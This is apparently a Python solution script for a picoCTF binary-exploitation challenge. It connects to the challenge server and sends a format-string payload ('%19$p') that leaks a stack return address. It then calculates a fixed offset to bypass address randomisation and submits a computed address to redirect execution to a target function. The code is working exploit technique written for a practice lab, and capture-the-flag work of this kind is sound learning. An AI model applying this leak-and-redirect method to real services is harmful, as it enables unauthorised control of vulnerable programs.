import socket

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect((socket.gethostbyname("rescued-float.picoctf.net"),53744))
_ = soc.recvfrom(512); #consuming initial text

# sub    rsp,0x60
# this is 96 bytes + rbp which is 8 bytes for a total of 104
# 13*8 for 104 bytes, and the last is rip
# due to the calling convention, printf considers the first 5 arguments
# as registers, so we need another 5 formats beforehand
# format_string_pl = b'%p'*5 + b'%p'*13 + b';%p'
format_string_pl = b'%19$p\r\n'
soc.sendall(format_string_pl)

addr = bytearray(64)
_ = soc.recvfrom_into(addr,64)
addr = addr.decode().split('\r\n')[0]
# the call instruction pushes the next mov
# instruction onto the stack, thats what we want
# this should be byte 1441 and we want to get to 136a

print("Rip on the stack is: ",addr,'\n')

OFFSET = int("1441",16) - int("136a",16)
addr = hex(int(addr,16) - OFFSET)

print("Found offset is:",OFFSET,'\n')
print("Found address is: ",addr,'\n')

payload = addr.encode() + b'r\n'
response = bytearray(1024)
soc.sendall(payload)
_ = soc.recvfrom_into(response,1024)
print(response.decode())
